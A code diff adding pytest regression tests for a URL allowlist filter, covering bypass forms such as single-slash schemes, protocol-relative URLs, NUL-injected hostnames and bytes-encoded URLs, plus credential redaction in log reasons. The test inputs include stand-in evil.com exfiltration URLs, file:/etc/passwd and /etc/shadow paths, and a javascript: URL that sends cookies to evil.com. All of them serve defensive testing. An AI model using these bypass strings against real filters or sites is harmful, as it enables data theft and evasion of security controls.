@@ -565,3 +565,164 @@ class TestBlockErrorSurface:
         record = caplog.records[-1]
         assert record.modelfuzz_category == "credential"
         assert record.modelfuzz_rule == "SecretPatternFilter"
+
+
+class TestURLAllowListDetectsURLsByScheme:
+    """Regression guard for the '://' gate, which failed OPEN when it guessed wrong.
+
+    `looks_like_url = "://" in url` is true only of the authority-bearing
+    spelling, so every other form a real client resolves was classified "not a
+    URL" and allowed straight through -- defeating both the host allowlist and
+    the scheme allowlist at once.
+    """
+
+    @pytest.fixture
+    def url_allowlist(self) -> URLAllowList:
+        return URLAllowList(allowed_domains=["api.internal.com"])
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "http:/evil.com/exfil",  # one slash; curl and WHATWG resolve to evil.com
+            "https:/evil.com",
+            "HTTP:/evil.com",
+            "http:/api.internal.com@evil.com",  # slips the userinfo check too
+            "//evil.com/x",  # protocol-relative
+        ],
+    )
+    def test_blocks_authority_less_http_forms(self, url_allowlist: URLAllowList, url: str):
+        assert url_allowlist(url) is not None
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "file:/etc/passwd",  # urlopen returns the file; file:// was already blocked
+            "data:text/html,<script>x</script>",
+            "javascript:location='//evil.com/?c='+document.cookie",
+            "mailto:x@evil.com",
+            "vbscript:msgbox",
+        ],
+    )
+    def test_blocks_disallowed_schemes_without_an_authority(
+        self, url_allowlist: URLAllowList, url: str
+    ):
+        """The scheme allowlist is evaluated before the authority is required.
+
+        Testing netloc first is what let these escape: no netloc meant an early
+        return, so the scheme check never ran.
+        """
+        assert url_allowlist(url) is not None
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            "hello world",
+            "",
+            "just some prose about api.internal.com",
+            "a/b/c",
+            "note: the deploy failed",
+            "TODO:fixthis",  # scheme-shaped, but opaque under an unknown scheme
+            "key:value",
+            "C:\\Users\\bob",  # a drive letter is one character, not a scheme
+            "ns:tag",
+        ],
+    )
+    def test_still_ignores_things_that_are_not_urls(self, url_allowlist: URLAllowList, value: str):
+        """Tightening detection must not turn the rule into a prose filter."""
+        assert url_allowlist(value) is None
+
+    def test_a_url_containing_whitespace_is_still_a_url(self, url_allowlist: URLAllowList):
+        """Whitespace disambiguates prose only where there is no '://'.
+
+        Using it to disqualify outright would have let 'http://evil.com/a b'
+        through -- a string the old gate blocked.
+        """
+        assert url_allowlist("http://evil.com/a b") is not None
+
+
+class TestURLAllowListHostnameValidation:
+    """A suffix match is only meaningful on a string that is actually a hostname."""
+
+    @pytest.fixture
+    def url_allowlist(self) -> URLAllowList:
+        return URLAllowList(allowed_domains=["api.internal.com"])
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            # getaddrinfo and curl truncate at the NUL and reach evil.com, while
+            # 'evil.com\x00.api.internal.com'.endswith('.api.internal.com') is True.
+            "http://evil.com\x00.api.internal.com/exfil",
+            "http://evil.com .api.internal.com/exfil",
+        ],
+    )
+    def test_rejects_illegal_characters_in_the_host(self, url_allowlist: URLAllowList, url: str):
+        violation = url_allowlist(url)
+        assert violation is not None
+        assert "Invalid URL" in violation.reason
+
+    def test_a_genuine_subdomain_is_still_allowed(self, url_allowlist: URLAllowList):
+        assert url_allowlist("https://sub.api.internal.com/v1") is None
+
+
+class TestURLAllowListWalksBytes:
+    """URLAllowList was the only walker in the library without a bytes branch."""
+
+    @pytest.fixture
+    def url_allowlist(self) -> URLAllowList:
+        return URLAllowList(allowed_domains=["api.internal.com"])
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            b"http://evil.com/exfil",
+            bytearray(b"http://evil.com/exfil"),
+            b"file:///etc/shadow",
+            {"redirect": b"http://evil.com"},
+            [b"http://evil.com"],
+        ],
+    )
+    def test_blocks_a_url_carried_as_bytes(self, url_allowlist: URLAllowList, value: object):
+        assert url_allowlist(value) is not None
+
+    def test_allows_permitted_urls_as_bytes(self, url_allowlist: URLAllowList):
+        assert url_allowlist(b"https://api.internal.com/v1") is None
+
+    def test_non_url_bytes_still_pass(self, url_allowlist: URLAllowList):
+        assert url_allowlist(b"bytes") is None
+
+
+class TestURLAllowListDoesNotEchoTheURL:
+    """Reasons reach a WARNING log and the exception text.
+
+    A URL carries credentials in its userinfo and query string, and control
+    characters in it can forge log lines, so no reason quotes the raw input --
+    the same invariant SecretPatternFilter and ShellCommandAllowList hold.
+    """
+
+    @pytest.fixture
+    def url_allowlist(self) -> URLAllowList:
+        return URLAllowList(allowed_domains=["api.internal.com"])
+
+    def test_userinfo_reason_does_not_leak_the_password(self, url_allowlist: URLAllowList):
+        violation = url_allowlist("https://svc-bot:Pa55w0rd-live@api.internal.com/v1")
+        assert violation is not None
+        assert "userinfo" in violation.reason
+        assert "Pa55w0rd" not in violation.reason
+        assert "svc-bot" not in violation.reason
+
+    def test_invalid_reason_does_not_leak_the_query_string(self, url_allowlist: URLAllowList):
+        violation = url_allowlist("http:/x?api_key=sk-live-9f3a2b")
+        assert violation is not None
+        assert "sk-live-9f3a2b" not in violation.reason
+
+    def test_reason_cannot_carry_a_forged_log_line(self, url_allowlist: URLAllowList):
+        violation = url_allowlist("http://evil.com\x00\n[modelfuzz] ALLOWED")
+        assert violation is not None
+        assert "\n" not in violation.reason
+
+    def test_the_hostname_is_still_named_when_it_is_safe_to(self, url_allowlist: URLAllowList):
+        """Redaction must not make the audit trail useless."""
+        violation = url_allowlist("http://evil.com/x")
+        assert violation is not None
+        assert "evil.com" in violation.reason
